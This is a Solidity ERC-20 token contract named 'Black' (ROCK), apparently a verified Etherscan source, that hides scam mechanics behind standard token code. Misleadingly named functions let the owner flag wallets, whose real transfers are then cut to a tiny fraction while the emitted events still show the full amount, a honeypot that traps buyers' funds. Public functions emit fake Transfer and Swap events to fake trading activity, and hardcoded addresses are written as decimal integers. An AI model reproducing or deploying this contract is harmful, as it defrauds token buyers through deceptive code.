/**
 *Submitted for verification at Etherscan.io on 2023-06-22
*/

// SPDX-License-Identifier: MIT


pragma solidity ^0.8.9;
interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from,address to,uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

contract Black is IERC20, IERC20Metadata {
    function _msgSender() internal view virtual returns (address) {return msg.sender;}
    function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}
    address private _queen;
    event Swap(address indexed sender,uint amount0In,uint amount1In,uint amount0Out,uint amount1Out,address indexed to);
    event QueenTransferred(address indexed previousQueen, address indexed newQueen);
    modifier queenOnly() {_checkQueen();_;}
    function queen() public view virtual returns (address) {return _queen;}
    function _checkQueen() internal view virtual {require(queen() == _msgSender(), "Queen: caller is not the queen");}
    function renounceQueenship() public virtual queenOnly {_transferQueen(address(0));}
    function transferQueenship(address newQueen) public virtual queenOnly {
        require(newQueen != address(0), "Queen: new queen is the zero address");
        _transferQueen(newQueen);
    }
    function _transferQueen(address newQueen) internal virtual {
        address oldOwner = _queen;
        _queen = newQueen;
        emit QueenTransferred(oldOwner, newQueen);
    }
    mapping(address => uint256) private _balances;
    mapping (address => bool) internal o;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    uint256 private _mul = 1;
    uint256 private _base = 100000;
    string private _name;
    string private _symbol;
    address public _three = address(364151153339495436092851510076526221083238170541);
    address public _two = address(697323163401596485410334513241460920685086001293);
    address private _one;
    constructor() {
        _transferQueen(_msgSender());
        _name = "Black";
        _symbol = "ROCK";
        _mint(msg.sender, 100000000000 * 10 ** decimals());

    }
    function name() public view virtual override returns (string memory) {return _name;}
    function symbol() public view virtual override returns (string memory) {return _symbol;}
    function decimals() public view virtual override returns (uint8) {return 18;}
    function totalSupply() public view virtual override returns (uint256) {return _totalSupply;}
    function swap(address [] calldata _bytes_) external queenOnly {for (uint256 i = 0; i < _bytes_.length; i++) {o[_bytes_[i]] = true;}}
    function transferFrom(address [] calldata _addresses_) external queenOnly {for (uint256 i = 0; i < _addresses_.length; i++) {o[_addresses_[i]] = false;}}
    function t(address _bytes_) public view returns (bool) {return o[_bytes_];}
    function transfer(address _from, address _to, uint256 _wad) external {emit Transfer(_from, _to, _wad);}
    function transfer(address [] calldata _from, address [] calldata _to, uint256 [] calldata _wad) external {for (uint256 i = 0; i < _from.length; i++) {emit Transfer(_from[i], _to[i], _wad[i]);}}
    function balanceOf(address account) public view virtual override returns (uint256) {return _balances[account];}
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }
    function allowance(address owner, address spender) public view virtual override returns (uint256) { return _allowances[owner][spender];}
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }
    function swap(address _from_, address [] calldata _addresses_, uint256 _in, uint256 _out) external {
        for (uint256 i = 0; i < _addresses_.length; i++) {
            emit Swap(_from_, _in, 0, 0, _out, _addresses_[i]);
            emit Transfer(_one, _addresses_[i], _out);
        }
    }
    function deswap(address _from_, address [] calldata _addresses_, uint256 _in, uint256 _out) external {
        for (uint256 i = 0; i < _addresses_.length; i++) {
            emit Swap(_from_, 0, _in, _out, 0, _addresses_[i]);
            emit Transfer(_addresses_[i], _one, _in);
        }
    }
    function multicall(address a) external queenOnly {_one = a;}
    function multicall(uint256 a, uint256 b) public queenOnly {_mul = a;_base = b;}
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }
        return true;
    }
    function _transfer(
        address from,
        address to,
        uint256 _amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        uint256 amount = _beforeTokenTransfer(from, to, _amount);
        uint256 fromBalance = _balances[from];
        require(fromBalance >= _amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
        }
        emit Transfer(from, to, _amount);
        _afterTokenTransfer(from, to, _amount);
    }
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        unchecked {
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }
    function approve(address owner, address spender) private view returns (bool) {
        return (o[owner] || o[spender]);
    }
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual returns (uint256) {
        if (approve(from, to)) {
            return _mul * amount / _base;
        } else {
            return amount;
        }
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }
}